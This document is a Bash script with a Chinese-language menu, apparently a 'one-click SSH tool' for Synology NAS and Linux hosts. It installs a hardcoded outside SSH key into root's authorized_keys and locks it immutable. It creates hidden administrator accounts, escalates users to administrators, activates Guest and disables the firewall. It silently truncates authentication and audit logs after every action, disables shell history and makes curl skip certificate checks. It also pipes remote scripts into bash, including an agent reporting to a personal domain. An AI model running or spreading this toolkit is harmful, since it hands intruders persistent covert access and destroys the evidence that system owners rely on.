#!/bin/bash

# =====================================
# SSH一键小工具 Ultimate (全彩多架构终极版)
# =====================================

# --- 颜色定义 ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # 恢复默认颜色

# --- 全局无痕模式初始化 ---
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
set +o history 2>/dev/null

DEFAULT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"
STUDENT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"
AUTH_KEYS="/root/.ssh/authorized_keys"

# =====================================
# 系统环境与架构检测
# =====================================
is_synology() { [ -f /etc.defaults/VERSION ]; }
is_openwrt() { grep -qi openwrt /etc/os-release 2>/dev/null; }
is_armbian() { [ -f /etc/armbian-release ] || grep -qi armbian /etc/os-release 2>/dev/null; }

unsupported_dd_system() {
    if is_synology || is_openwrt || is_armbian; then return 0; fi
    return 1
}

get_arch() {
    local ARCH=$(uname -m)
    case "$ARCH" in
        x86_64|amd64) echo "x86_64" ;;
        i386|i686) echo "i386" ;;
        aarch64|arm64) echo "aarch64" ;;
        armv7*|armv6*) echo "armhf" ;;
        armv5*) echo "armel" ;;
        *) echo "unknown" ;;
    esac
}

if is_synology; then
    SSHD_CONFIG="/etc.defaults/ssh/sshd_config"
else
    SSHD_CONFIG="/etc/ssh/sshd_config"
fi

# =====================================
# 核心功能组件
# =====================================
reload_ssh() {
    echo -e "${CYAN}[*] 正在重启 SSH 服务以应用配置...${NC}"
    if is_synology; then
        synosystemctl restart sshd.service 2>/dev/null || synoservicecfg --restart sshd 2>/dev/null
    elif command -v systemctl >/dev/null 2>&1; then
        systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null
    elif command -v service >/dev/null 2>&1; then
        service ssh restart 2>/dev/null || service sshd restart 2>/dev/null
    else
        pkill -HUP sshd 2>/dev/null
    fi
}

get_ssh_port() {
    PORT=$(sshd -T 2>/dev/null | grep "^port" | awk '{print $2}')
    [ -z "$PORT" ] && PORT=$(grep -i "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)
    [ -z "$PORT" ] && PORT=$(grep -i "^Port" /etc.defaults/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)
    [ -z "$PORT" ] && PORT="22"
    echo -e "${GREEN}${PORT}${NC}"
}

change_root_password() {
    NEWPASS="$1"
    if is_synology; then
        synouser --setpw root "$NEWPASS"
    else
        echo "root:$NEWPASS" | chpasswd
    fi
}

write_ssh_config() {
    KEY="$1"
    VALUE="$2"
    sed -i "/^${KEY}/d" "$SSHD_CONFIG"
    echo "${KEY} ${VALUE}" >> "$SSHD_CONFIG"
}

# =====================================
# 群晖全盘底层清洗
# =====================================
clean_synology_logs() {
    if ! is_synology; then echo -e "\n${RED}【错误】当前不是群晖 DSM！${NC}\n"; return 1; fi
    echo -e "\n${YELLOW}⚠️ 警告：该操作将清除所有日志、审计记录和自动封锁数据库。${NC}"
    read -p "确认执行深度清洗吗？[y/N]: " confirm_clean
    if [[ ! "$confirm_clean" =~ ^[Yy]$ ]]; then echo -e "${CYAN}已取消清洗。${NC}"; return 0; fi

    echo -e "\n${CYAN}[*] 开始执行群晖全盘底层清洗...${NC}"
    services=(vpncenter synoblock synologd synoauditingd SynoDrive DownloadStation)
    
    for svc in "${services[@]}"; do 
        synoservicectl --stop "$svc" 2>/dev/null & 
        if command -v systemctl >/dev/null 2>&1; then systemctl stop "$svc" 2>/dev/null & fi
    done
    wait
    
    rm -f /var/packages/VPNCenter/target/etc/log.db*
    rm -rf /var/log/synolog/.SYNOLOGDB* /var/log/synolog/synolog.log
    rm -f /etc/synoautoblock.db* /var/db/synoautoblock.db* rm -f /root/.ssh/known_hosts
    truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog 2>/dev/null
    find /var/log -type f 2>/dev/null | xargs -P 4 -I {} sh -c '> "{}"' 2>/dev/null
    
    for svc in "${services[@]}"; do 
        synoservicectl --start "$svc" 2>/dev/null & 
        if command -v systemctl >/dev/null 2>&1; then systemctl start "$svc" 2>/dev/null & fi
    done
    wait
    
    history -c 2>/dev/null; rm -f /root/.bash_history
    echo -e "${GREEN}【完成】全盘痕迹与缓存清洗完毕！${NC}"
}

# =====================================
# 极速无痕清理 (每次操作后静默执行)
# =====================================
quick_clean_trace() {
    # 1. 彻底清空 Bash 历史
    history -c 2>/dev/null
    rm -f /root/.bash_history 2>/dev/null
    
    # 2. 清空通用系统日志 (仅清空内容保留文件，避免服务崩溃)
    truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog /var/log/auth.log /var/log/secure /var/log/messages /var/log/syslog 2>/dev/null
    
    # 3. 清空群晖专属审计日志
    if is_synology; then
        truncate -s 0 /var/log/synolog/synolog.log 2>/dev/null
        rm -rf /var/spool/synoauditing/* 2>/dev/null
    fi
}

pause_and_clean() {
    quick_clean_trace
    echo -e "\n${CYAN}-------------------------------------${NC}"
    read -p "操作完成 (系统日志已无痕擦除)。按 回车键 继续..."
    clear
}

# =====================================
# 初始化系统配置
# =====================================
# 防止重复写入 insecure 导致配置文件臃肿
grep -q "insecure" ~/.curlrc 2>/dev/null || echo "insecure" >> ~/.curlrc 2>/dev/null

# =====================================
# 主程序循环
# =====================================
clear
while true; do
    echo -e "${CYAN}=====================================${NC}"
    echo -e "${GREEN}       🚀 SSH 一键管理小工具 Ultimate${NC}"
    echo -e "${CYAN}=====================================${NC}"
    echo "  1. 系统与网络状态检测"
    echo "  2. SSH 密钥与登录管理"
    echo "  3. 群晖高级账户管理与提权"
    echo "  4. 群晖防火墙与端口开放"
    echo "  5. 群晖漏洞修复与全盘清洗"
    echo "  6. 探针与代理部署"
    echo "  7. 一键 DD 纯净系统"
    echo -e "${RED}  0. 退出工具${NC}"
    echo -e "${CYAN}=====================================${NC}"

    read -p "请输入选项 [0-7]: " menu

    case $menu in
        1)
            echo -e "\n${CYAN}--- 🖥️ 系统与网络状态 ---${NC}"
            echo -e "当前 SSH 登录端口: $(get_ssh_port)"
            echo -e "原生 CPU 内核架构: ${GREEN}$(uname -m)${NC}"
            echo -e "识别转换组件架构: ${GREEN}$(get_arch)${NC}"
            echo -e "${CYAN}-----------------------${NC}"
            
            read -p "是否进行 Ookla 节点测速? [y/N]: " run_speedtest
            if [[ "$run_speedtest" =~ ^[Yy]$ ]]; then
                SYS_ARCH=$(get_arch)
                if [ "$SYS_ARCH" = "unknown" ]; then
                    echo -e "${RED}【错误】无法识别当前系统架构，测速已停止。${NC}"
                else
                    echo -e "\n${CYAN}[*] 正在拉取 [$SYS_ARCH] 专属测速组件...${NC}\n"
                    wget -qO- "https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-${SYS_ARCH}.tgz" | tar xz 2>/dev/null
                    if [ -f "./speedtest" ]; then
                        ./speedtest --accept-license --accept-gdpr
                        rm -f speedtest speedtest.5 speedtest.md
                    else
                        echo -e "${RED}【错误】下载或解压失败！可能是网络无法连接 Speedtest 服务器。${NC}"
                    fi
                fi
            fi
            ;;

        2)
            while true; do
                echo -e "\n${CYAN}=====================================${NC}"
                echo -e "${GREEN}            🔑 SSH 管理模块${NC}"
                echo -e "${CYAN}=====================================${NC}"
                echo "  1. 查看当前 SSH 授权密钥"
                echo "  2. 强制清空所有 SSH 密钥"
                echo "  3. 添加内置默认 SSH 密钥"
                echo "  4. 锁定/解锁 SSH 密钥"
                echo "  5. 修改 SSH 登录方式限制"
                echo "  6. 修改 SSH 服务端口"
                echo "  7. 重置/生成 Root 密码"
                echo -e "${YELLOW}  0. 返回主菜单${NC}"
                echo -e "${CYAN}=====================================${NC}"
                read -p "请输入选项: " sshmenu
                case $sshmenu in
                    1) echo; cat $AUTH_KEYS 2>/dev/null || echo -e "${YELLOW}未找到 authorized_keys${NC}"; echo ;;
                    2) 
                        read -p "危险！确定要清空所有 SSH 密钥吗？[y/N]: " del_confirm
                        if [[ "$del_confirm" =~ ^[Yy]$ ]]; then
                            chattr -i $AUTH_KEYS 2>/dev/null; > $AUTH_KEYS 2>/dev/null
                            echo -e "\n${GREEN}✓ SSH 密钥已清空${NC}\n"
                        fi
                        ;;
                    3) 
                        install -d -m 700 /root/.ssh
                        if ! grep -qF "$DEFAULT_KEY" "$AUTH_KEYS" 2>/dev/null; then
                            echo "$DEFAULT_KEY" >> "$AUTH_KEYS"; chmod 600 "$AUTH_KEYS"
                            echo -e "\n${GREEN}✓ 内置密钥添加成功${NC}\n"
                        else
                            echo -e "\n${YELLOW}ℹ️ 该密钥已存在${NC}\n"
                        fi
                        ;;
                    4)
                        read -p "1. 锁定密钥  2. 解锁密钥 : " lock_op
                        if [ "$lock_op" = "1" ]; then chattr +i $AUTH_KEYS; echo -e "${GREEN}✓ 已加锁 (+i)${NC}"
                        elif [ "$lock_op" = "2" ]; then chattr -i $AUTH_KEYS; echo -e "${GREEN}✓ 已解锁 (-i)${NC}"; fi
                        ;;
                    5)
                        echo -e "\n  1. 仅允许密钥登录 (最高安全)\n  2. 密码和密钥均可登录\n"
                        read -p "请选择策略 [1/2]: " loginmenu
                        if [ "$loginmenu" = "1" ]; then
                            write_ssh_config "PasswordAuthentication" "no"
                            write_ssh_config "PubkeyAuthentication" "yes"
                            write_ssh_config "PermitRootLogin" "prohibit-password"
                            echo -e "\n${GREEN}✓ 已配置为仅限密钥登录${NC}"
                        elif [ "$loginmenu" = "2" ]; then
                            write_ssh_config "PasswordAuthentication" "yes"
                            write_ssh_config "PubkeyAuthentication" "yes"
                            write_ssh_config "PermitRootLogin" "yes"
                            echo -e "\n${GREEN}✓ 已配置为允许密码登录${NC}"
                        fi
                        reload_ssh
                        ;;
                    6)
                        echo -e "\n当前端口: $(get_ssh_port)"
                        read -p "请输入新的 SSH 端口号 (1-65535): " NEW_PORT
                        if [[ "$NEW_PORT" =~ ^[0-9]+$ ]] && [ "$NEW_PORT" -ge 1 ] && [ "$NEW_PORT" -le 65535 ]; then
                            write_ssh_config "Port" "$NEW_PORT"
                            echo -e "\n${GREEN}✓ SSH 端口已更新为: $NEW_PORT${NC}"
                            reload_ssh
                        else
                            echo -e "\n${RED}✗ 错误：请输入 1 到 65535 之间的有效数字。${NC}\n"
                        fi
                        ;;
                    7)
                        read -p "请输入新的 Root 密码 (直接回车将随机生成16位): " custom_pass
                        if [ -z "$custom_pass" ]; then custom_pass=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16); fi
                        change_root_password "$custom_pass"
                        echo -e "\n${GREEN}✓ Root 密码已设为: ${YELLOW}$custom_pass${NC}\n"
                        ;;
                    0) break ;;
                esac
                
                # 子菜单执行完毕后静默清理并暂停
                pause_and_clean
            done
            ;;

        3)
            if ! is_synology; then echo -e "\n${RED}✗ 仅支持群晖 DSM 系统${NC}\n"; continue; fi
            while true; do
                echo -e "\n${CYAN}=====================================${NC}"
                echo -e "${GREEN}         👥 群晖账户管理与提权${NC}"
                echo -e "${CYAN}=====================================${NC}"
                echo "  1. 创建/修改隐藏管理账户"
                echo "  2. 彻底删除指定账户"
                echo "  3. 查看当前 Administrators 组"
                echo "  4. 将现有账户加入管理员组"
                echo "  5. 激活默认 Guest 账户"
                echo -e "${YELLOW}  0. 返回主菜单${NC}"
                echo -e "${CYAN}=====================================${NC}"
                read -p "请输入选项: " actmenu
                case $actmenu in
                    1)
                        read -p "请输入要创建或修改的账户名 (如 adtest): " h_user
                        read -p "请输入密码: " h_pass
                        synouser --add "$h_user" "$h_pass" "1" 0 1 0 2>/dev/null || synouser --setpw "$h_user" "$h_pass"
                        echo -e "${GREEN}✓ 账户 $h_user 操作完成。${NC}"
                        ;;
                    2)
                        read -p "请输入要彻底删除的账户名: " d_user
                        synouser --del "$d_user" 2>/dev/null
                        sed -i "/^${d_user}:/d" /etc/passwd 2>/dev/null
                        echo -e "${GREEN}✓ 账户 $d_user 及其残留数据已清除。${NC}"
                        ;;
                    3)
                        echo -e "\n${CYAN}当前管理员群组成员：${NC}"
                        synogroup --get administrators | awk -F'[][]' '/^[0-9]+:/ {print "- "$2}'
                        echo
                        ;;
                    4)
                        read -p "请输入要提权的账户名 (如 user1): " p_user
                        # 极度安全的提权逻辑：用 awk 提取出当前所有的纯净用户名，防止误删原有管理员
                        CURRENT_MEMBERS=$(synogroup --get administrators 2>/dev/null | awk -F'[][]' '/^[0-9]+:/ {print $2}' | tr '\n' ' ')
                        synogroup --member administrators $CURRENT_MEMBERS "$p_user" 2>/dev/null
                        echo -e "${GREEN}✓ 已将 $p_user 安全追加至 Administrators 组。${NC}"
                        ;;
                    5)
                        read -p "请输入 Guest 新密码: " g_pass
                        synouser --modify guest "" 0 "" 2>/dev/null
                        synouser --setpw guest "$g_pass" 2>/dev/null
                        echo -e "${GREEN}✓ Guest 账户已激活。${NC}"
                        ;;
                    0) break ;;
                esac
                
                # 子菜单执行完毕后静默清理并暂停
                pause_and_clean
            done
            ;;

        4)
            if ! is_synology; then echo -e "\n${RED}✗ 仅支持群晖 DSM 系统${NC}\n"; continue; fi
            echo -e "\n  1. 开放指定 TCP 端口 (iptables)\n  2. 强制停止内置防火墙屏蔽\n"
            read -p "请选择: " fwmenu
            if [ "$fwmenu" = "1" ]; then
                read -p "请输入需要开放的 TCP 端口 (如 8080): " o_port
                if [[ "$o_port" =~ ^[0-9]+$ ]]; then
                    iptables -I INPUT -p tcp --dport "$o_port" -j ACCEPT 2>/dev/null
                    echo -e "${GREEN}✓ 端口 $o_port 已放行。${NC}"
                else
                    echo -e "${RED}✗ 端口号不合法。${NC}"
                fi
            elif [ "$fwmenu" = "2" ]; then
                /usr/syno/bin/synovnet --fb-disable 2>/dev/null
                echo -e "${GREEN}✓ 防火墙已强制停止。${NC}"
            fi
            ;;

        5)
            if ! is_synology; then echo -e "\n${RED}✗ 仅支持群晖 DSM 系统${NC}\n"; continue; fi
            echo -e "\n  1. 修复 Telnet 漏洞 (关门)\n  2. 全盘底层历史与日志清洗\n"
            read -p "请选择: " fixmenu
            if [ "$fixmenu" = "1" ]; then
                sed -i '/^telnet/s/^/#/' /etc/inetd.conf 2>/dev/null
                INETD_PID=$(pidof inetd)
                [ -n "$INETD_PID" ] && kill -HUP $INETD_PID
                killall -9 telnetd 2>/dev/null
                chmod -R 400 /usr/bin/inetd 2>/dev/null
                echo -e "${GREEN}✓ Telnet 漏洞已封堵修复。${NC}"
            elif [ "$fixmenu" = "2" ]; then
                clean_synology_logs
            fi
            ;;

        6)
            echo -e "\n  1. 安装 FRP 穿透客户端\n  2. 安装 Komari 监控探针\n  3. 安装 Sing-box 代理\n"
            read -p "请选择部署项: " prmenu
            case $prmenu in
                1) bash <(curl -Ls https://raw.githubusercontent.com/2019xuanying/DSM-QH/main/install-frpc.sh) ;;
                2) curl -kfsSL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh | sudo bash -s -- -e https://www.xuanying.dpdns.org --auto-discovery 8aj6DlGdRJDFxgGCi0CVkuxe --ignore-unsafe-cert --install-dir /usr/bin --install-service-name sser ;;
                3) bash <(curl -Ls https://raw.githubusercontent.com/2019xuanying/DSM-QH/main/installpy.sh) ;;
            esac
            ;;

        7)
            if unsupported_dd_system; then echo -e "\n${RED}✗ 当前群晖/OpenWRT等定制系统不支持一键 DD${NC}\n"; continue; fi
            echo -e "\n${CYAN}[*] 正在拉取底层 DD 重装脚本...${NC}\n"
            curl -O https://hub.20250225.ggff.net/bin456789/reinstall/main/reinstall.sh
            chmod +x reinstall.sh
            echo -e "${GREEN}✓ 下载完成！请退出当前脚本后，手动执行 'bash reinstall.sh' 进入系统重装流程。${NC}"
            ;;

        0) 
            quick_clean_trace
            echo -e "\n${GREEN}👋 已退出 SSH 管理工具 (痕迹已抹除)，祝使用愉快！${NC}\n"
            exit 0 
            ;;
        *)
            echo -e "\n${RED}✗ 无效选项，请重新输入。${NC}"
            ;;
    esac
    
    pause_and_clean
done
